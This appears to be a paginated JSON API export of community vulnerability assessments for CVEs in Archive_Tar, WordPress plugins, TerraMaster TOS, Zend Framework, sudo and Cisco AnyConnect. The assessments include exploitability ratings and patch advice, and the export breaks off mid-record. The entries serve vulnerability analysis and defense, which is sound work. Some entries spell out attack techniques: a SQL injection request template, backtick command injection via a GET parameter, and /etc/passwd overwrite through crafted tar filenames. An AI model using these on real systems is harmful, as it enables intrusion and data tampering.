{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=10&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=8&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=9&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "12dc6840-6897-467c-9bf2-db40c8dfa12f",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "e0a0701e-20c0-4622-aa27-40f9b66c0263",
      "created": "2021-01-15T19:39:12.640785Z",
      "revisionDate": "2021-01-26T21:29:05.708354Z",
      "document": "Edit: PoC code for this can be found at https://github.com/pear/Archive_Tar/issues/33 along with the original advisory.\r\n\r\nAn interesting vulnerability using the concepts of PHAR file deserialization as first discussed at BlackHat in this video: https://www.youtube.com/watch?v=OrEar0TiS90. For those who don't know, the `phar://` file stream handler allows opening PHAR files, which are basically PHP archive files containing a bunch of related files (mostly tends to be PHP files within the archive, but can be other things as well). Whats interesting about PHAR files is that their metadata is formed via a `serialize()` call when their created, and when files are extracted, `unserialize()` will automatically be called on that metadata string. This leads to the potential for serialization attacks even when the application doesn't explicitly use `unserialize()` calls.\r\n\r\nIn this case, the Archive_Tar developers were aware of this prior research and attempted to explicitly block `phar://`, `../`, and `..\\` within any file name contained with the `tar` archive by performing a `strpos` call using these strings and erroring out if the string contained these characters. Unfortunately that check is really poor for a number of reasons. \r\n\r\nThe specific reason related to this CVE, aka CVE-2020-28948, is that users can simply use `PHAR://` to bypass this check. In other words, the check performed by `strpos()` is not case sensitive, so one can easily bypass it by simply changing the case of the string. They could also mix the case, so an example like `pHaR://` might also work.\r\n\r\nThis then allows attackers to perform attacks where they can load a local PHAR file on the target system and use a deserialization attack to perform some malicious action. Assuming an app is already extracting the contents of the TAR files locally, an attacker would simply have to upload a TAR file containing a malicious PHAR file and have the app extract and save the PHAR file locally, after which they could upload a second TAR file containing a file named `PHAR://*malicious PHAR file location*` and the PHP app would attempt to access and extract the local PHAR file, thereby triggering the vulnerability.\r\n\r\nNotice that the `PHAR://` file handler does not allow for accessing remote files, which is why this procedure is required.\r\n\r\nResearch into deserialization gadgets for this exploit showed that most of the potential possibilities seem mostly restricted to file operations. The PoC showed that it would be possible to delete a file using this vulnerability but I was not able to determine any other useful actions that could be performed. Potential impact would depend both on the privileges of the user running PHP as well as what operations the app was doing; again remember the program will only be able to do file operations so most likely an attacker would have to package a malicious PHP file within the PHAR archive, have that be extracted somehow along with the malicious PHAR file, and then also have a file within the TAR archive that has a filename of `PHAR://*path to malicious PHAR archive that was uploaded*` to form a full end to end payload and get RCE.\r\n\r\nOverall I'd say this is an interesting bug but its exploitability is somewhat limited and depends highly on the underlying application it is used within.",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "ffc7cd48-a6d9-4e10-a751-311ae067dab1",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "be278831-3863-408b-a0df-f5ba31743619",
      "created": "2021-01-15T20:42:48.173253Z",
      "revisionDate": "2021-01-26T17:27:29.355187Z",
      "document": "Original advisory and PoC can be found at https://github.com/pear/Archive_Tar/issues/33\r\n\r\nThis vulnerability is very similar to [CVE-2020-28948](https://attackerkb.com/topics/jwBHsAjcuV/cve-2020-28948), with a couple of key differences. In the case of CVE-2020-28948, the root issue was that the code within Archive_Tar didn't use case sensitive checks to ensure file names didn't start with `phar://`. Here the issue is the same however it stems from a lack of checks. More specifically as mentioned in [my writeup on CVE-2020-28948](https://attackerkb.com/assessments/12dc6840-6897-467c-9bf2-db40c8dfa12f), Archive_Tar prior to 1.4.11 checked, using `strpos()`, that filenames within a TAR archive did not start with the characters `phar://` and did not contain the characters `../` or `..\\`. \r\n\r\nNotice however that there is a problem here: we can still use any other file stream wrapper other than the `phar://` file handler within a file name to trigger the corresponding wrapper handler.  A full list of PHP file stream wrappers can be found at https://www.php.net/manual/en/wrappers.php. \r\n\r\nLooking at these stream wrappers reveals there are a few that might help with file writes. In fact, as shown in the PoC at https://github.com/pear/Archive_Tar/issues/33, if one creates a file within a TAR archive with a name such as `file:///etc/passwd`, then when the TAR archive is extracted, the corresponding file, which in this case would be `/etc/passwd`, will be overwritten with attacker controlled contents, assuming the user that PHP is running as has permissions to create or overwrite that file.\r\n\r\nThis leads to an arbitrary file upload vulnerability whereby an attacker could potentially overwrite existing files with arbitrary content. The attacker would however need to know the exact path on disk to the file that they wished to write: remember that `..\\` and `../` are not allowed in filenames and even if they were, the `file://` stream wrapper requires the use of absolute paths.\r\n\r\nAgain as noted in [my writeup on CVE-2020-28948](https://attackerkb.com/assessments/12dc6840-6897-467c-9bf2-db40c8dfa12f), this bug entirely depends on the fact that a vulnerable application makes use of this library and also extracts the contents of the TAR file as part of its operations. If the application only allows TAR file uploads but it doesn't actually try to extract the contents of the TAR file as part of its operations, then this vulnerability will never be triggered.\r\n\r\nThat being said assuming an attacker does know the right path and the application is set up in to extract TAR files, then this can easily lead to RCE via overwriting existing PHP files on the target system.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "6d889b5d-0692-417b-ad44-eaa5f13b6f49",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "4e9d15c5-c14d-4d5d-b9e3-436a099f36b9",
      "created": "2021-01-18T15:04:14.035794Z",
      "revisionDate": "2021-01-26T17:27:23.62024Z",
      "document": "Blind SQLi in Chop Slider 3 by iDangero.us.  The true value of this exploit is low, simply because the company stopped supporting the plugin several years before the exploit was discovered.  Most users had therefore moved away from the plug-in before disclosure.\r\n\r\nThe iDangero.us Chop Slider 3 WordPress plugin prior to version 3.4 contains a blind SQL injection in the `id` parameter of the `get_sript/index.php` page.  The injection is passed through `GET` parameters, and thus must be encoded, and magic_quotes is applied at the server.\r\n\r\nExploitable in default config, a valid `id` is not required.\r\n\r\nhttps://github.com/rapid7/metasploit-framework/pull/14576",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 1,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "57a3cb42-d0ea-450d-bb47-d39bcf5e7f7c",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "a93881e2-cfb7-49e3-81cf-664913bea12e",
      "created": "2021-01-18T15:11:43.730451Z",
      "revisionDate": "2021-01-21T17:48:53.197849Z",
      "document": "This is a rather neat vulnerability IMO.\r\n\r\nEasy WP SMTP versions <= 1.4.2 has a non-default `debug` option.  When set, the WordPress plugin creates a `[a-z0-9]{5,15}_debug_log.txt` file in the `wp-content/plugins/easy-wp-smtp/` directory.  Problem is, this folder allows directory listings, so the file can easily be accessed.  The debug log file contains SMTP logs for the Wordpress instance.\r\n\r\nAttack chain is as follows:\r\n1. find the debug_log file\r\n2. request a password reset for an account\r\n3. read the debug_log file which will have the password reset link for that user\r\n4. use the link to change the password for that user.\r\n\r\nPretty easy to exploit, but but not necessarily in an automated way since the password change may have unknown requirements.  Easy to do manually though!\r\n\r\nThe file may also contain creds for the SMTP server!\r\n\r\nhttps://github.com/rapid7/metasploit-framework/pull/14474",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "ee1755e9-81bd-4911-8ee2-7db761ff8285",
      "editorId": "c01088ae-afdb-4473-8ec7-2acbf8c5b7ae",
      "topicId": "25cb51b6-102d-495a-b744-7cf120799f91",
      "created": "2021-01-18T23:27:09.603134Z",
      "revisionDate": "2021-01-21T17:48:44.285923Z",
      "document": "This exploit is ok. When running on my attack box I had to modify the code. Not the worse case. Just a few commands threw syntax errors. In the end the CVE was able to provide a salt and hash that gave me credentials to get into the box.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b273fd24-835c-4ef6-a9d6-1d7210199811",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "29d948ee-4fa2-4f62-9c25-3f3c95ee6f3d",
      "created": "2021-01-20T01:48:27.739737Z",
      "revisionDate": "2021-01-21T17:48:17.396239Z",
      "document": "A blind, time based SQL injection was discovered in Email Subscribers & Newsletters WordPress plugin versions before 4.3.1.  The `hash` parameter is vulnerable to injection.  While readily accessible, and a decent amount of installs, the SQLi is relatively complex compared to most commons SQLi for Wordpress Plugins.  The request requires a GUID (random is fine), and email (random is fine), and is formatted as such:\r\n`{\"contact_id\":\"100','100','100','3'),('1594999398','1594999398','1',(1) AND #{payload},'100','100','3'),('1594999398','1594999398','1','100\",\"campaign_id\":\"100\",\"message_id\":\"100\",\"email\":\"#{email}\",\"guid\":\"#{guid}\",\"action\":\"open\"}`\r\n\r\n\r\nhttps://github.com/rapid7/metasploit-framework/pull/14418",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2298bea0-5bea-4ac1-9e27-1c6c8c852537",
      "editorId": "ea51e75e-ff49-4074-b46e-89a19292649d",
      "topicId": "02032f86-191f-4f60-b473-deaa0bcf1d48",
      "created": "2021-01-20T04:08:06.52621Z",
      "revisionDate": "2021-01-21T17:48:15.912234Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "717acbbf-14b0-4ee8-aa6c-3da1149fc8c1",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "91d890f5-9586-4750-8ca1-76adb51c0a9b",
      "created": "2021-01-21T03:28:00.426417Z",
      "revisionDate": "2021-01-25T18:25:39.440245Z",
      "document": "Noted as exploited in the wild by CheckPoint Research at https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/, who noted an exploit for this vulnerability was being used as part of a botnet building operation.\r\n\r\nLooking into their writeup, they note that remote unauthenticated attackers can use this vulnerability to take over the TerraMaster TOS operating system via command injection in the `event` parameter in the `/include/makecvs.php` page. Interestingly they don't specify the user the attacker's injected command will run as, but they do include a very useful screenshot which shows that a GET request to `/include/makecve.php?Event=%60`, followed by the command the attacker wishes to execute,  followed by another `%60`, will allow for arbitrary command injection. %60 is `, which suggests that the command being executed may have been enclosed in backticks, and that by escaping these backticks, the attacker is able to execute arbitrary commands.\r\n\r\nUsers can patch this vulnerability by upgrading to version 4.2.06 of Terramaster TOS on their NAS devices. Given the severity of this bug and evidence of exploitation in the wild, it is strongly encouraged to patch this vulnerability as soon as possible.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cf01c7bc-e590-4a30-b54f-64d28ae85038",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "2a9031fa-d646-4c09-bbe2-a5061795f45b",
      "created": "2021-01-21T03:48:26.18374Z",
      "revisionDate": "2021-01-21T17:47:54.859464Z",
      "document": "Reported as exploited in the wild by CheckPoint Research as part of the FreakOut attacks, as written up at https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/. This operation was designed to create a IRC controlled botnet that could be used for future operations, and for coin mining.\r\n\r\nAs written in https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/, the attackers abused the Zend3 feature (which loads classes from objects) of Zend Framework version 3.0.0 and higher to  cause a deserialization issue. In the case of the FreakOut attacks, attackers sent a crafted POST request to `/zend3/public` with a serialized payload containing a `callback` parameter, and injected commands to be executed into the serialized `callbackOptions` parameter in place of the normal array.\r\n\r\nThere is also a nice analysis of this vulnerability at https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md should you wish to dive further into the gory details of the bug. This is written in Chinese though so you might need to translate it first.\r\n\r\nAs there is a lot of information on this vulnerability out at the moment, I am rating this as a high probability of exploitability not cause its a complex bug, but purely because given Checkpoint Research's writeable, all an attacker has to do is write a sample request from the screenshot provided, and they will be able to replicate the bug and craft a working exploit. Otherwise this would normally have a lower exploitability rating as deserialization bugs are not always that simple to exploit.\r\n\r\nAdditionally, the bigger concern here is that there is no patch for this vulnerability for the Zend Framework to the best of my knowledge, since it is no longer supported by its developers. Users who are affected by this vulnerability are therefore encouraged to migrate to a different framework as soon as possible and severely limit interaction with any servers running Zend Framework in the meantime.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b3ec467f-1a05-451f-870b-70e4e3e0d4ef",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "3b64b132-1e7a-49bb-a187-96db3b84bd2a",
      "created": "2021-01-21T03:53:56.035504Z",
      "revisionDate": "2021-01-22T01:35:16.380243Z",
      "document": "This has now been reported as being exploited in the wild as part of the FreakOut attacks as first reported by CheckPoint Research at https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/.",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c6c67780-aa08-42dd-be50-e0479bc3e62d",
      "editorId": "20112ccc-9c63-4170-82ef-6d3f573908d8",
      "topicId": "67aa97ac-e920-4d0c-9b50-6b1c42e683d1",
      "created": "2021-01-27T06:16:58.909708Z",
      "revisionDate": "2021-01-27T06:16:58.928435Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": []
    },
    {
      "id": "4c282f16-075f-40bb-bad2-af906053c31b",
      "editorId": "a21031d5-0022-4ab5-8982-86027fda65ed",
      "topicId": "67aa97ac-e920-4d0c-9b50-6b1c42e683d1",
      "created": "2021-01-27T08:10:40.346082Z",
      "revisionDate": "2021-01-28T21:05:01.734196Z",
      "document": "",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6154f041-23c8-4a0d-8f87-79c82d523f60",
      "editorId": "e1c5b251-db85-4a19-9f9d-af0341bc4848",
      "topicId": "d476227f-c4b1-49e3-9947-897077e5150d",
      "created": "2021-01-27T09:26:48.120213Z",
      "revisionDate": "2021-01-27T09:26:48.12657Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "ba8517df-f452-4012-9c11-edf9ff8b17f1",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "67aa97ac-e920-4d0c-9b50-6b1c42e683d1",
      "created": "2021-01-27T15:40:07.200172Z",
      "revisionDate": "2021-02-05T19:59:55.734414Z",
      "document": "Sudo is vulnerable to a local privilege escalation that enables any local user to gain root privileges. This is due to a heap-based buffer overflow when unescaping backslashes in the command's arguments. This vulnerable code has been introduced in [July 2011](https://github.com/sudo-project/sudo/commit/8255ed69b9c426d90a10c6d68e8d2241d7f3260e). According to the [advisory](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt), legacy versions from 1.8.2 to 1.8.31p2 and stable versions from 1.9.0 to 1.9.5p1 are vulnerable in their default configurations. Note that the local user password is not required to successfully exploit this vulnerability.\r\n\r\nThe exploitation is done by invoking \"sudoedit -s\" command to reach the vulnerable code and do an out-of-bounds write in heap memory. The security researchers were able to exploit this vulnerability and get a shell as root using 3 different methods. One of them, which seems to be the easiest and the most reliable, is demo'ed in this [video](https://vimeo.com/504872555).\r\n\r\nI couldn't find any PoC available, but there are enough technical details in the advisory to write an exploit. It is a critical bug and sudo should be [patched](https://github.com/sudo-project/sudo/releases/tag/SUDO_1_9_5p2) immediately. It is very likely a working exploit will be publicly available soon.\r\n",
      "score": 7,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "482ab083-1dcc-41db-b82f-990780973a5d",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "91d890f5-9586-4750-8ca1-76adb51c0a9b",
      "created": "2021-01-28T23:58:01.41721Z",
      "revisionDate": "2021-01-29T00:07:46.569508Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/Roht5ldvzE/cve-2020-28188#rapid7-analysis). CVE-2020-28188 is being used in the \"FreakOut\" attack campaign.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "7a07cd59-19d4-4cb3-a3fa-002e7641717b",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "2a9031fa-d646-4c09-bbe2-a5061795f45b",
      "created": "2021-01-28T23:58:25.964555Z",
      "revisionDate": "2021-01-29T00:07:59.197049Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/y7abEWYmav/cve-2021-3007#rapid7-analysis). CVE-2021-3007 is being used in the \"FreakOut\" attack campaign.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e6b5c3e0-937f-4a8b-8ed5-fce604343731",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "a4bdbfb9-4493-4ef5-8c05-276721f6549f",
      "created": "2021-01-29T17:47:10.208111Z",
      "revisionDate": "2021-02-11T01:58:05.435936Z",
      "document": "Since this got a little more attention later in 2020, it's probably good to note here that there are a number of different implementations of Oracle Coherence, and the likeliest attack vector that we've seen is WebLogic Server. WebLogic had a number of vulnerabilities that were exploited in the wild (some widely, e.g., [CVE-2020-14882](https://attackerkb.com/topics/sb4F8UT5zu/cve-2020-14882-unauthenticated-rce-in-console-component-of-oracle-weblogic-server?referrer=2555#rapid7-analysis) and [CVE-2020-14750](https://attackerkb.com/topics/mzyS1rMcZc/cve-2020-14750-oracle-weblogic-remote-unauthenticated-remote-code-execution-rce-vulnerability?referrer=2555)) in 2020. Definitely a good idea to keep tight WebLogic patch cycles whenever possible. ",
      "score": 4,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        }
      ]
    },
    {
      "id": "b76693c1-6199-4813-ba97-87b13390dbb3",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "024e1b87-5e35-4d1d-be39-a370f2954fc1",
      "created": "2021-01-29T22:43:57.941293Z",
      "revisionDate": "2021-02-11T01:58:06.898502Z",
      "document": "Interesting vulnerability :) On Windows systems running Cisco AnyConnect Secure Mobility Client for Windows releases earlier than Release 4.9.04043, authenticated attackers could modify a configuration file that was loaded and used when Cisco AnyConnect starts up to load an arbitrary DLL and have it be run as the SYSTEM user. The advisory at https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-anyconnect-dll-injec-pQnryXLf does not specify which file this is, however I imagine it would be possible to find it by using ProcMon, applying the appropriate filters, and then restarting the Cisco AnyConnect process and looking for any attempts to load a configuration file. From there it would then just be a case of figuring out the configuration file format.\r\n\r\nUnfortunately without knowing the configuration file format, its a little hard to say how tough this vulnerability is to exploit. Given that you can load an arbitrary DLL file though I imagine the file format must not be too stringent, as otherwise such behavior would be blocked, but this says nothing as to whether the file is a binary format, a text format, or something else or if there are many fields that need to be filled in for the exploit to succeed or just a few.\r\n\r\nGiven this I'm giving this exploitability rating a 3/5 to play on the safe side of things. Its probably possible but without further info its possible it may take some effort to form a valid configuration file which could make exploitation of this vulnerability considerably more difficult.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c5232a52-f7e0-4fcb-a391-deb5c5d33d52",
      "editorId": "a2e57d6b-6159-4cce-bc8e-b6211908e34c",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2021-01-30T01:40:29.394174Z",
      "revisionDate": "2021-02-11T01:57:57.68267Z",
      "document": "Almost 2 years later and this is still found in the wild. ",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
